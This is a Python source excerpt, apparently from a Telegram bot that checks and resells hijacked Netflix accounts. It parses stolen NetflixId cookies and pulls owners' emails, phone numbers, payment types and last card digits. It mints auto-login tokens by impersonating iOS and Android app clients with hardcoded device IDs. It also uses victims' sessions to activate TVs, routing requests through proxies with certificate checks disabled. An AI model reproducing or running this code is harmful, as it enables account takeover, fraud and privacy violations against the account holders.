                if cb:
                    cb()
            except:
                self.bad += 1
                if cb:
                    cb()

# ========== GLOBALS ==========
cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()
user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_tasks = {}
pool_file_lock = asyncio.Lock()
users_file_lock = threading.Lock()
used_file_lock = threading.Lock()
keys_file_lock = threading.Lock()

async def cleanup_user(user_id: str):
    async with user_locks[user_id]:
        if user_id in user_state and not user_state[user_id].get('busy', False):
            del user_state[user_id]
        if user_id in user_tasks and user_tasks[user_id].done():
            del user_tasks[user_id]

global_stats = {
    "total_mass_checks": 0,
    "total_single_checks": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}
tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}
STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check")]
])
GLOBAL_EXECUTOR = ThreadPoolExecutor(max_workers=MAX_WORKERS * 2)

TOKEN_CACHE = {}
TOKEN_CACHE_TTL = 1800
TOKEN_CACHE_LOCK = asyncio.Lock()
TOKEN_CACHE_LAST_CLEANUP = 0
TOKEN_CACHE_MAX_SIZE = 2000

async def cleanup_token_cache():
    global TOKEN_CACHE_LAST_CLEANUP
    now = time.time()
    if now - TOKEN_CACHE_LAST_CLEANUP < 300:
        return
    async with TOKEN_CACHE_LOCK:
        expired = [k for k, (_, exp) in TOKEN_CACHE.items() if exp < now]
        for k in expired:
            del TOKEN_CACHE[k]
        if len(TOKEN_CACHE) > TOKEN_CACHE_MAX_SIZE:
            sorted_items = sorted(TOKEN_CACHE.items(), key=lambda x: x[1][1])
            for k, _ in sorted_items[:len(TOKEN_CACHE) - TOKEN_CACHE_MAX_SIZE]:
                del TOKEN_CACHE[k]
        TOKEN_CACHE_LAST_CLEANUP = now

proxy_manager = ProxyManager()
proxy_manager.load_from_file(PROXY_FILE)

_pool_cache = {
    "basic": [],
    "standard": [],
    "premium": [],
    "last_refresh": 0
}

async def get_pool_cached(force=False):
    now = time.time()
    if force or (now - _pool_cache["last_refresh"] > POOL_CACHE_TTL):
        async with pool_file_lock:
            basic = await read_plan_file_async(BASIC_FILE)
            standard = await read_plan_file_async(STANDARD_FILE)
            premium = await read_plan_file_async(PREMIUM_FILE)
            _pool_cache["basic"] = basic
            _pool_cache["standard"] = standard
            _pool_cache["premium"] = premium
            _pool_cache["last_refresh"] = now
    return _pool_cache["basic"], _pool_cache["standard"], _pool_cache["premium"]

async def read_plan_file_async(path: str) -> List[str]:
    if not os.path.exists(path):
        return []
    async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    tokens = []
    seen = set()
    for line in lines:
        nid = extract_netflix_id(line)
        if nid and nid not in seen:
            tokens.append(nid)
            seen.add(nid)
    return tokens

def read_plan_file(path: str) -> List[str]:
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    tokens = []
    seen = set()
    for line in lines:
        nid = extract_netflix_id(line)
        if nid and nid not in seen:
            tokens.append(nid)
            seen.add(nid)
    return tokens

async def write_plan_file_async(path: str, nids: List[str]):
    async with aiofiles.open(path, 'w', encoding='utf-8') as f:
        await f.write("\n".join(nids))

async def get_pool_counts(force=False) -> Dict:
    basic, standard, premium = await get_pool_cached(force=force)
    return {"basic": len(basic), "standard": len(standard), "premium": len(premium)}

# ========== UTILITY FUNCTIONS ==========
def extract_netflix_id(raw: str) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    if raw.startswith('ct='):
        return raw
    try:
        decoded = urllib.parse.unquote(raw)
        if 'NetflixId=' in decoded:
            after = decoded.split('NetflixId=')[1].split(';')[0].strip()
            if after.startswith('ct='):
                return after
            return after
        if decoded.startswith('ct='):
            return decoded
        ct_match = re.search(r'ct=([^&]+)', decoded)
        if ct_match:
            return 'ct=' + ct_match.group(1)
    except:
        pass
    match = re.search(r'NetflixId\s*[:=]\s*([^\s;,\n"\']+)', raw, re.IGNORECASE)
    if match:
        val = match.group(1).strip('"\'')
        if val.startswith('ct='):
            return val
        return val
    if len(raw) > 20:
        return raw
    return None

def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html_mod.unescape(str(value))
    try:
        cleaned = codecs.decode(cleaned, 'unicode_escape')
    except:
        pass
    cleaned = cleaned.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
    cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned or None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        if value == 1:
            return True
        if value == 0:
            return False
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    truthy = {"true", "yes", "1", "on"}
    falsy = {"false", "no", "0", "off"}
    if lowered in truthy:
        return True
    if lowered in falsy:
        return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

# ========== GRAPHQL EXTRACTION ==========
def extract_info_from_graphql_payload(response_text: str) -> Dict:
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data")
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    hold_status = format_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta
    ) or format_boolean_label(growth_account.get("isUserOnHold"))

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": phone_digits,
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
        "maxStreams": current_plan.get("maxStreams") or next_plan.get("maxStreams"),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in [f.get("type", "").upper() for f in (current_plan.get("availableFeatures") or [])] else "No",
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text and re.fullmatch(r"\d{4}", payment_display_text):
            info["maskedCard"] = payment_display_text
        # ---- Extra member detection ----
    if not info.get('showExtraMemberSection'):
        plan = info.get('localizedPlanName', '').lower()
        if 'extra member' in plan or 'miembro extra' in plan:
            info['showExtraMemberSection'] = 'Yes'
        status = info.get('membershipStatus', '').lower()
        if 'extra_member' in status:
            info['showExtraMemberSection'] = 'Yes'
        # Also check isExtraMemberAccount if present
        if info.get('isExtraMemberAccount') == 'Yes':
            info['showExtraMemberSection'] = 'Yes'            

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}

# ========== PLAN DETECTION ==========
def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    try:
        simplified = unicodedata.normalize("NFKD", plan_name)
        simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    except:
        simplified = plan_name
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def get_canonical_output_label(plan_key):
    labels = {
        "premium": "Premium",
        "standard_with_ads": "Standard With Ads",
        "standard": "Standard",
        "basic": "Basic",
        "mobile": "Mobile",
        "extra_member_premium": "Premium (Extra Member)",
        "free": "Free",
    }
    return labels.get(plan_key, "Unknown")

def derive_plan_info(info: Dict, is_subscribed: bool) -> Tuple[str, str]:
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = info.get("maxStreams")
    try:
        streams = int(streams) if streams else None
    except:
        streams = None

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {"premium", "cao_cap", "高級", "ozel", "المميزة", "พรีเมียม", "프리미엄", "プレミアム", "פרימיום", "πριμιουμ", "premium_plan", "extra_member_premium"},
        "standard_with_ads": {"standard_with_ads", "estandar_con_anuncios", "padrao_com_anuncios", "광고형_스탠다드", "standard_avec_pub", "standard_with_adverts", "standard_abo_mit_werbung", "الخطة_القياسية_مع_اعلانات"},
        "standard": {"standard", "estandar", "標準", "standardowy", "padrao", "standart", "มาตรฐาน", "스탠다드", "スタンダード", "τυπικο", "القياسية", "סטנדרטית", "norma"},
        "basic": {"basic", "basico", "dasar", "basique", "basis", "基本", "베이직", "ベーシック", "temel", "พื้นฐาน", "podstawowy", "الاساسية", "בסיסית", "osnovni", "alap"},
        "mobile": {"ponsel", "mobile", "seluler", "movil", "มือถือ", "모바일", "モバイル"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        if streams >= 4:
            return "premium", "Premium"
        if streams >= 2:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"

def is_extra_member_account(info: Dict) -> bool:
    if not isinstance(info, dict):
        return False
    explicit = info.get("showExtraMemberSection")
    if explicit and explicit.lower() in ("yes", "true"):
        return True
    raw_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    if "extra member" in raw_plan.lower() or "miembro extra" in raw_plan.lower():
        return True
    return False

def is_subscribed_account(info: Dict) -> bool:
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    if is_extra_member_account(info):
        return True
    return False

def is_on_hold_account(info: Dict) -> bool:
    hold = format_boolean_label((info or {}).get("holdStatus"))
    if hold == "Yes":
        return True
    if hold == "No":
        return False
    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
    return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused"))

def derive_output_plan_bucket(info: Dict, is_subscribed: bool) -> Tuple[str, str, str]:
    plan_key, plan_name = derive_plan_info(info, is_subscribed)
    folder_label = get_canonical_output_label(plan_key)
    display_label = plan_name or folder_label
    if is_subscribed and is_extra_member_account(info):
        extra_plan_key = "extra_member_premium"
        extra_label = get_canonical_output_label(extra_plan_key)
        if extra_label == "Unknown":
            extra_label = f"{folder_label} (Extra Member)"
        return extra_plan_key, extra_label, extra_label
    return plan_key, folder_label, display_label

# ========== TOKEN GENERATION ==========
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken_ios(cookie_dict: Dict) -> Tuple[Optional[Dict], Optional[str]]:
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token:
            return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        if expires and isinstance(expires, int) and expires < time.time():
            return None, "Token already expired"
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
    except Exception as e:
        return None, str(e)

def generate_nftoken_android(cookie_dict: Dict) -> Tuple[Optional[str], Optional[str]]:
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    try:
        session = requests.Session()
        session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                }
            },
        }
        r = session.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={
                "User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13)",
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            data = r.json()
            token = (data.get("data") or {}).get("createAutoLoginToken")
            if token:
                return token, None
        return None, "Android token generation failed"
    except Exception as e:
        return None, str(e)

def generate_nftoken(cookie_dict: Dict, retries: int = 1) -> Tuple[Optional[Dict], Optional[str]]:
    result, err = generate_nftoken_ios(cookie_dict)
    if result:
        return result, None
    token, err2 = generate_nftoken_android(cookie_dict)
    if token:
        return {'token': token, 'expires': 'Unknown', 'expires_unix': None}, None
    return None, err or err2 or "All token methods failed"

def validate_token(token: str) -> bool:
    if not token:
        return False
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})
        resp = session.get(
            f"https://netflix.com/?nftoken={token}",
            timeout=10,
            allow_redirects=True,
            verify=False
        )
        if 'YourAccount' in resp.url or 'account' in resp.url:
            return True
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return False
        if 'membershipStatus' in resp.text or 'planName' in resp.text:
            return True
        return False
    except:
        return False

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
    if m:
        s, u, p, h, port = m.groups()
        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
        return {"http": url, "https": url}
    m = re.match(r'^([^:]+):(\d+)$', line)
    if m:
        return {"http": f"http://{m.group(1)}:{m.group(2)}", "https": f"http://{m.group(1)}:{m.group(2)}"}
    return None

def load_proxies():
    proxies = []
    for p in proxy_manager.proxies:
        parsed = parse_proxy_line(p)
        if parsed:
            proxies.append(parsed)
    return proxies

# ========== TV LOGIN FUNCTIONS ==========
TV_CODE_ERROR_PATTERNS = [
    # ... existing patterns ...
    r"mã đó không chính xác",
    r"không chính xác",
    r"vui lòng thử lại",
    r"mã không hợp lệ",
    r"that code is incorrect",
    r"that code is invalid",
    # ... rest of the list ...
    r"that code wasn'?t right",
    r"code (is )?(incorrect|invalid|wrong)",
    r"try again",
    r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no",
    r"int[ée]ntalo de nuevo",
    r"intenta (de )?nuevo",
    r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
    r"esse c[oó]digo n[aã]o",
    r"tente novamente",
    r"code (est |n'est pas |incorrect|invalide)",
    r"ce code n'est",
    r"r[ée]essayez",
    r"essayez encore",
    r"code (ist |ung[uü]ltig|falsch)",
    r"versuchen sie es erneut",
    r"codice (non [eè] |sbagliato|non valido)",
    r"riprova",
    r"kod (yanlış|ge[çc]ersiz|hatalı|doğru değil)",
    r"tekrar dene",
    r"الرمز (غير صحيح|خطأ|خاطئ)",
    r"حاول مرة أخرى",
    r"הקוד (שהזנת |שגוי|לא נכון)",
    r"כדאי לנסות שוב",
    r"m[ãa] (đó|không đúng|không ch[íi]nh x[áa]c|sai)",
    r"thử lại",
    r"kod (jest |nieprawidłowy|błędny)",
    r"spr[óo]buj ponownie",
    r"код (неверный|неправильный|ошибочный)",
    r"попробуйте",
    r"代码(有误|错误|无效|不正确)",
    r"请重试",
    r"再试一[次遍]",
    r"代碼(有誤|錯誤|無效|不正確)",
    r"請重試",
    r"再試一[次遍]",
    r"kode (salah|tidak valid|tidak tepat)",
    r"coba lagi",
    r"รหัส(ที่คุณป้อน)?(ไม่ถูกต้อง|ผิด)",
    r"ลองอีกครั้ง",
    r"코드(가|는)?(잘못|틀렸|올바르지 않)",
    r"다시 시도",
    r"コード(が|は)?(間違|違|正しく)",
    r"もう一度",
    r"कोड (गलत|अमान्य)",
    r"पुनः प्रयास",
    r"फिर से",
    r"code (is |niet |onjuist|verkeerd)",
    r"probeer opnieuw",
    r"codul (este |nu este |incorect|gre[sș]it)",
    r"[iî]ncearc[aă] din nou",
    r"a k[oó]d (hib[aá]s|nem megfelel)",
    r"pr[oó]b[aá]ld [uú]jra",
    r"ο κωδικ[οό]ς (είναι |δεν είναι |λάθος|εσφαλμέν)",
    r"δοκιμ[άα]στε ξαν[άα]",
    r"koden (är |stämmer inte |felaktig|ogiltig)",
    r"f[oö]rs[oö]k igen",
    r"koden (er |stemmer ikke |feil|ugyldig)",
    r"pr[oø]v igjen",
    r"koden (er |er ikke |forkert|ugyldig)",
    r"pr[oø]v igen",
    r"koodi (on |ei ole |virheellinen|v[aä][aä]r[aä])",
    r"yrit[aä] uudelleen",
    r"k[oó]d (je |nen[íi] |nespr[aá]vn[yý]|chybn[yý])",
    r"zkuste to znovu",
    r"код (нев[іи]рний|неправильний|помилковий)",
    r"спробуйте (ще раз|знову)",
]

def is_tv_code_error(cleaned_text: str) -> bool:
    text_lower = cleaned_text.lower()
    for pattern in TV_CODE_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            return True
    return False

def is_tv_code_success(final_url: str, cleaned_text: str) -> bool:
    if "/tv/out/success" in final_url.lower():
        return True
    success_patterns = [
        r"tu tv est[aá] lista",
        r"your tv is ready",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"הטלוויזיה שלך מוכנ",
        r"تلفازك جاهز",
        r"tv của bạn đã sẵn sàng",
        r"tw[oó]j telewizor jest gotowy",
    ]
    for pat in success_patterns:
        if re.search(pat, cleaned_text.lower()):
            return True
    return False

def extract_auth_url(html_text: str) -> Optional[str]:
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'value="(c1\.[^"]+)"',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code: str, proxy: Optional[dict] = None) -> Dict:
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"TV page unavailable (HTTP {r.status_code})"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)[:50]}"}

    auth_url = extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }

    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
            allow_redirects=True
        )
    except Exception as e:
        return {"success": False, "error": f"Activation request failed: {str(e)[:50]}"}

    final_url = r.url

    text_clean = re.sub(r'<script[^>]*>.*?</script>', '', r.text, flags=re.DOTALL | re.IGNORECASE)
    text_clean = re.sub(r'<style[^>]*>.*?</style>', '', text_clean, flags=re.DOTALL | re.IGNORECASE)
    text_clean = re.sub(r'<[^>]+>', ' ', text_clean)
    text_clean = html_mod.unescape(text_clean)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip()
    
        # Check for explicit "code not found" messages
    if re.search(r'code not found|invalid tv code|the code you entered is incorrect|that code wasn’t right', r.text, re.I):
        return {"success": False, "error": "INVALID_CODE"}

    if is_tv_code_error(text_clean):
        return {"success": False, "error": "Invalid or expired TV code"}

    if is_tv_code_success(final_url, text_clean):
        return {"success": True, "error": None}

    return {"success": False, "error": "Unknown response from Netflix"}

def validate_cookie_tv(cookies, proxy=None):
    with requests.Session() as session:
        session.cookies.update(cookies)
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            r = session.get(
                "https://www.netflix.com/account/membership",
                headers=headers,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT,
                verify=False,
                allow_redirects=True
            )

            if 'login' in r.url.lower() or 'signin' in r.url.lower():
                return False, None, None

            if r.status_code != 200:
                return False, None, None

            # --- Extract info first ---
            info = generator.extract_account_info(r.text)

            # --- Check restart patterns ONLY if plan is missing ---
            plan = info.get('localizedPlanName')
            if (not plan or plan in ('N/A', 'Unknown', 'null', '')) and is_restart_page(r.text):
                return False, None, None

            if re.search(r'"membershipStatus"\s*:\s*"INACTIVE"', r.text, re.IGNORECASE):
                return False, None, None

            if is_on_hold_account(info):
                return False, None, None

            country = info.get('countryOfSignup') or re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text).group(1) if re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text) else None
            if not country:
                country = re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text).group(1) if re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text) else None

            plan_name = info.get('localizedPlanName') or re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text).group(1) if re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text) else None
            if not plan_name:
                plan_name = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text).group(1) if re.search(r'"planName"\s*:\s*"([^"]+)"', r.text) else "Unknown"

            has_account = bool(info.get('email')) or 'Account' in r.text or 'membershipStatus' in r.text

            return has_account and country is not None, country, plan_name

        except Exception as e:
            log.error(f"validate_cookie_tv error: {e}")
            return False, None, None

def extract_cookie_dict_tv(content):
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            if data.get('cookies'):
                data = data['cookies']
            elif data.get('items'):
                data = data['items']
            else:
                data = [data]
        if isinstance(data, list):
            cookies = {}
            for c in data:
                if isinstance(c, dict):
                    name = c.get('name', '')
                    if name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
                        cookies[name] = str(c.get('value', ''))
            if cookies.get('NetflixId'):
                return cookies
    except:
        pass

    cookies = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5]
            if name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
